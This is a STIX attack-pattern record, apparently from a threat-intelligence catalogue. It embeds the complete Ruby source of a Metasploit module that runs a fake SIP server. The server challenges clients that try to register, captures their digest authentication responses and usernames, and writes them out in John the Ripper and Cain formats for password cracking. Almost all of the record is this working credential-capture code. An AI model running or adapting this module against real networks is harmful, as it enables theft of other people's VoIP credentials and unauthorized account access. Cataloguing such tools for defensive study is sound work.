{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--073edacd-3f65-413d-9ff3-bf81d59d46ae",
    "created": "2024-08-14T16:22:00.819552Z",
    "modified": "2024-08-14T16:22:00.819556Z",
    "name": "Authentication Capture: SIP",
    "description": " This module provides a fake SIP service that is designed to capture authentication credentials. It captures\tchallenge and response pairs that can be supplied to Cain or JtR for cracking. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/sip.rb",
            "external_id": "sip.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/socket'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: SIP',\n      'Description'    => %q{\n        This module provides a fake SIP service that is designed to\n        capture authentication credentials. It captures\tchallenge and\n        response pairs that can be supplied to Cain or JtR for cracking.\n      },\n      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run SIP capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 5060 ]),\n        OptAddress.new('SRVHOST',   [ true, \"The local host to listen on.\", '0.0.0.0' ]),\n        OptString.new('NONCE', [ true, \"The server byte nonce\", \"1234\" ]),\n        OptString.new('JOHNPWFILE',  [ false, \"The prefix to the local filename to store the hashes in JOHN format\", nil ]),\n        OptString.new('CAINPWFILE',  [ false, \"The local filename to store the hashes in Cain&Abel format\", nil ]),\n      ])\n    register_advanced_options(\n      [\n        OptString.new(\"SRVVERSION\", [ true, \"The server version to report in the greeting response\", \"ser (3.3.0-pre1 (i386/linux))\" ]),\n        OptString.new('REALM', [false, \"The SIP realm to which clients authenticate\", nil ]),\n      ])\n  end\n\n  def sip_parse_authorization(data)\n    kvps = {}\n    kvps['scheme'] = data.slice!(0, data.index(' '))\n    data.split(/,\\s?/).each do | item |\n      tokens = item.scan(/^\\s?([^=]*)=\\\"?(.*?)\\\"?$/)[0]\n      kvps[tokens[0]] = tokens[1]\n    end\n    kvps\n  end\n\n  def sip_parse_request(data)\n    response = {\n      :headers_raw => [],\n      :headers => {},\n      :uri => nil,\n      :method => nil,\n      :protocol => nil\n    }\n    status = data.slice!(0, data.index(/\\r?\\n/)+1).split(/\\s/)\n    response[:method] = status[0]\n    response[:uri] = status[1]\n    response[:protocol] = status[2]\n\n    while data.index(/\\r?\\n/)\n      header = (data.slice!(0, data.index(/\\r?\\n/)+1)).chomp\n      response[:headers_raw] << header\n      key, val = header.split(/:\\s*/, 2)\n      response[:headers][key] = val\n    end\n    response\n  end\n\n  def sip_send_error_message(request, code, msg)\n    ip = @requestor[:ip]\n    port = @requestor[:port]\n    tag = (0...8).map{65.+(rand(25)).chr}.join\n    nonce = datastore['NONCE']\n    realm = datastore['REALM'] ? datastore['REALM'] : sip_sanitize_address(ip)\n    auth = []\n\n    auth << \"SIP/2.0 #{code} #{msg}\"\n    auth << (\"Via: #{request[:headers]['Via']};received=#{ip}\").gsub(\"rport\", \"rport=#{port}\")\n    auth << \"From: #{request[:headers]['From']}\"\n    auth << \"To: #{request[:headers]['To']};tag=#{tag}\"\n    auth << \"Call-ID: #{request[:headers]['Call-ID']}\"\n    auth << \"CSeq: #{request[:headers]['CSeq']}\"\n    auth << \"Expires: 600\"\n    auth << \"Min-Expires: 240\"\n    auth << \"WWW-Authenticate: Digest realm=\\\"#{realm}\\\", nonce=\\\"#{nonce}\\\"\"\n    auth << \"Server: #{datastore['SRVVERSION']}\"\n    auth << \"Content-Length: 0\"\n    auth << \"\"\n\n    @sock.sendto(auth.join(\"\\r\\n\") << \"\\r\\n\", @requestor[:ip].to_s, @requestor[:port])\n  end\n\n  # removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR\n  def sip_sanitize_address(addr)\n    if ( addr =~ /:/ )\n      return addr.scan(/.*:(.*)/)[0][0]\n    end\n    return addr\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    begin\n      @port = datastore['SRVPORT'].to_i\n      @sock = Rex::Socket::Udp.create(\n            'LocalHost' => datastore['SRVHOST'],\n            'LocalPort' => @port,\n            'Context'   => {'Msf' => framework, 'MsfExploit' => self} )\n      @run = true\n      server_ip = sip_sanitize_address(datastore['SRVHOST'])\n\n      while @run\n        res = @sock.recvfrom()\n        @requestor = {\n          :ip => res[1],\n          :port => res[2]\n        }\n        client_ip = sip_sanitize_address(res[1])\n        next if not res[0] or res[0].empty?\n        request = sip_parse_request(res[0])\n        method = request[:method]\n\n        case method\n        when \"REGISTER\"\n          authorization = ( request[:headers]['Authorization'] ? request[:headers]['Authorization'] : request[:headers]['Proxy-Authorization'] )\n          if authorization\n            if ( request[:uri] =~ /^sip:.*?:\\d+/ )\n              # current versions of the JtR plugin will fail cracking SIP uri:s containing a port; eg. sip:1.2.3.4:5060\n              print_status(\"URI with port detected in authorization SIP request, JtR may fail to crack the response\")\n            end\n\n            auth_tokens = sip_parse_authorization(authorization)\n            response = ( auth_tokens['response'] ? auth_tokens['response'] : \"\" )\n            algorithm= ( auth_tokens['algorithm'] ? auth_tokens['algorithm'] : \"MD5\" )\n            username = auth_tokens['username']\n            proof = \"client: #{client_ip}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}\"\n            print_good(\"SIP LOGIN: #{proof}\")\n\n            report_cred(\n              ip: @requestor[:ip],\n              port: @requestor[:port],\n              service_name: 'sip_client',\n              user: username,\n              password: response + \":\" + auth_tokens['nonce'] + \":\" + algorithm,\n              proof: proof\n            )\n\n            if datastore['JOHNPWFILE']\n              resp = []\n              resp << \"$sip$\"\n              resp << server_ip\n              resp << client_ip\n              resp << username\n              resp << auth_tokens['realm']\n              resp << method\n              resp << \"sip\"\n              resp << request[:uri].scan(/^.*?:(.*)$/)\n              resp << auth_tokens['nonce']\n              resp << ( auth_tokens['cnonce'] ? auth_tokens['cnonce'] : \"\" )\n              resp << ( auth_tokens['nc'] ? auth_tokens['nc'] : \"\" )\n              resp << ( auth_tokens['qop'] ? auth_tokens['qop'] : \"\" )\n              resp << algorithm\n              resp << response\n\n              fd = File.open(datastore['JOHNPWFILE'] + '_sip' , \"ab\")\n              fd.puts(username + \":\" + resp.join(\"*\"))\n              fd.close\n            end\n\n            if datastore['CAINPWFILE']\n              resp = []\n              resp << auth_tokens['realm']\n              resp << auth_tokens['username']\n              resp << \"\"\n              resp << request[:uri]\n              resp << auth_tokens['nonce']\n              resp << response\n              resp << method\n              resp << algorithm\n\n              fd = File.open(datastore['CAINPWFILE'], \"ab\")\n              fd.puts resp.join(\"\\t\") + \"\\r\\n\"\n              fd.close\n            end\n\n            sip_send_error_message(request, 401, \"Unauthorized\")\n          else\n            sip_send_error_message(request, 401, \"Unauthorized\")\n          end\n        when \"ACK\"\n          # do nothing\n        else\n          print_error(\"Unhandled method: #{request[:method]}\")\n          sip_send_error_message(request, 401, \"Unauthorized\")\n        end\n      end\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused\n      nil\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e.backtrace}\")\n    ensure\n      @sock.close\n    end\n  end\nend\n"
}